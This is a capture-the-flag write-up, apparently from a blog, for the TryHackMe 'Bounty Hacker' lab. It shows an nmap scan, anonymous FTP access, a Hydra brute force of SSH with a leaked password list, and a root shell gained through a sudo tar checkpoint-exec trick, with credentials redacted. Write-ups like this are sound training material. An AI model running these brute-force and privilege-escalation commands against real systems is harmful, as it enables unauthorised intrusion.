---
title: Bounty Hacker
tags: [TryHackMe, Facile, Bruteforce]
style: fill
color: danger
modified: 2024-08-26
comments: false
description: Une box particulièrement facile pour débuter
---

# TryHackMe: Bounty Hacker <!-- omit in toc -->

![box image](https://tryhackme-images.s3.amazonaws.com/room-icons/9ad38a2cc31d6ae0030c888aca7fe646.jpeg)
![Easy](https://img.shields.io/badge/Difficulty-Easy-Green?logo=tryhackme)

>All the important informations like usernames, passwords, and flags will be  redacted so everybody can take the challenge. Have fun!

## Table of Content <!-- omit in toc -->

* [1. Enumeration](#1-enumeration)
* [2. The FTP Server](#2-the-ftp-server)
* [3. Bruteforce SSH with Hydra](#3-bruteforce-ssh-with-hydra)
* [4. Connection to the server](#4-connection-to-the-server)
  * [4.1. User flag](#41-user-flag)
  * [4.2. Root access](#42-root-access)

---

## 1. Enumeration

The first task of this box is to find open port. So let's run `nmap`.

```bash
$ nmap -T4 -A 10.10.xx.xx 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 11:59 CET
Nmap scan report for 10.10.xx.xx
Host is up (0.042s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.63.xxx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.96 seconds
```

We found a FTP server with anonymous login allowed on port 21, a SSH server on port 22, and an Apache web server on port 80.

The web server allows us to understand the story of our character. Nothing useful for the next steps.

## 2. The FTP Server

Let's check what we can find in the FTP server.

```bash
$ ftp anonymous@10.10.xx.xx  
Connected to 10.10.xx.xx.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

We can download the files with the `get <file>` command.

If we open the `task.txt` file, we can find the name required for to answer the first question of the box

```bash
$ cat task.txt    
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

[redacted]
```

The other document looks like a passwords file. Maybe we can use it to perform some bruteforce attack on the SSH server.

```bash
$ head -n 5 locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
```

## 3. Bruteforce SSH with Hydra

Now we have a potential username within the `task.txt` file and what might be a passwords file, let's check if we can find the right password.

```bash
$ hydra -l [redacted] -P locks.txt 10.10.xx.xx ssh   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-20 12:24:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.xx.xx:22/
[22][ssh] host: 10.10.xx.xx   login: [redacted]   password: [redacted]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-20 12:24:27
```

We have a match! Now we can access the machine via SSH

## 4. Connection to the server

### 4.1. User flag

```bash
$ ssh [redacted]@10.10.xx.xx
[redacted]@10.10.xx.xx's password: 
[redacted for brevity]
[redacted]@bountyhacker:~/Desktop$ ls -hl
total 4.0K
-rw-rw-r-- 1 [redacted] [redacted] 21 Jun  7  2020 user.txt
[redacted]@bountyhacker:~/Desktop$ cat user.txt 
[redacted]
```

The user flag can easily be found on the user desktop. Now let's escalate our privileges.

### 4.2. Root access

```bash
[redacted]@bountyhacker:~/Desktop$ sudo -l
[sudo] password for [redacted]: 
Matching Defaults entries for [redacted] on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User [redacted] may run the following commands on bountyhacker:
    (root) /bin/tar
```

The user has the ability to use the command `/bin/tar` as sudo user. The [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo) website will help us taking advantage of this privilege.

```bash
[redacted]@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
root@bountyhacker:~/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
```

We got the root shell with the command we found! Now we are close to find the root flag.

```bash
root@bountyhacker:~# cd /root
root@bountyhacker:/root# cd ~/Desktop/
root@bountyhacker:~/Desktop# cd /root
root@bountyhacker:/root# ls -hl
total 4.0K
-rw-r--r-- 1 root root 19 Jun  7  2020 root.txt
root@bountyhacker:/root# cat root.txt 
[redacted]
```
